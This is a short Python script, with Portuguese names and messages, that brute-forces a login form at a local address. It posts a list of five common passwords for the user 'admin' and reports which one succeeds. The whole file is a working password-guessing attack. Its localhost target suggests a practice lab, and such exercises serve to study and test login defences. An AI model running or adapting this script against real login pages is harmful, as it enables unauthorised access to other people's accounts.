import requests

url_page = 'http://127.0.0.1:5000/login'
usuario = 'admin'

senhas = ["123", "admin", "root", "12345", "senha"]

for senha in senhas:
    r = requests.post(url_page, data={'usuario': usuario, 'senha': senha})
    if 'Login bem-sucedido' in r.text:
        print(f'[+]senha encontrada {senha}')
        break
    else:
        print(f'[-]tentativa com {senha} falha')